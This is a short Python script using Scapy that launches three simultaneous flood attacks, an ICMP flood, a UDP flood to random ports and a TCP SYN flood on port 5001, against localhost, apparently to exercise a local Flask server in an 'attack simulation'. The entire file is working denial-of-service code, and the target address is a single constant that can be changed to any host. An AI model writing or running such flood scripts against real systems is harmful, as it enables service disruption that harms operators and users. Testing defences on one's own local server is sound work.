from scapy.all import IP, ICMP, UDP, TCP, send, conf, get_if_list
import time
import random
import threading

# Update to target localhost (Flask server)
TARGET_IP = "127.0.0.1"  # Match Flask server's IP
TARGET_PORT = 5001

# Set the network interface
try:
    available_interfaces = get_if_list()
    print("Available interfaces:", available_interfaces)
    if "lo0" in available_interfaces:
        conf.iface = "lo0"  # Use loopback for localhost on macOS
    else:
        raise ValueError("Loopback interface 'lo0' not found. Available interfaces: " + str(available_interfaces))
except Exception as e:
    print(f"Error setting interface: {e}")
    exit(1)

def icmp_flood():
    print("Starting ICMP Flood...")
    while True:
        try:
            pkt = IP(dst=TARGET_IP) / ICMP()
            send(pkt, verbose=True)
            time.sleep(0.01)
        except Exception as e:
            print(f"ICMP Flood Error: {e}")
            time.sleep(1)

def udp_flood():
    print("Starting UDP Flood...")
    while True:
        try:
            pkt = IP(dst=TARGET_IP) / UDP(dport=random.randint(1, 65535), sport=random.randint(1024, 65535))
            send(pkt, verbose=True)
            time.sleep(0.01)
        except Exception as e:
            print(f"UDP Flood Error: {e}")
            time.sleep(1)

def tcp_syn_flood():
    print("Starting TCP SYN Flood...")
    while True:
        try:
            pkt = IP(dst=TARGET_IP) / TCP(dport=TARGET_PORT, sport=random.randint(1024, 65535), flags="S")
            send(pkt, verbose=True)
            time.sleep(0.01)
        except Exception as e:
            print(f"TCP SYN Flood Error: {e}")
            time.sleep(1)

if __name__ == "__main__":
    threads = [
        threading.Thread(target=icmp_flood),
        threading.Thread(target=udp_flood),
        threading.Thread(target=tcp_syn_flood)
    ]
    
    for thread in threads:
        thread.daemon = True
        thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping attack simulation...")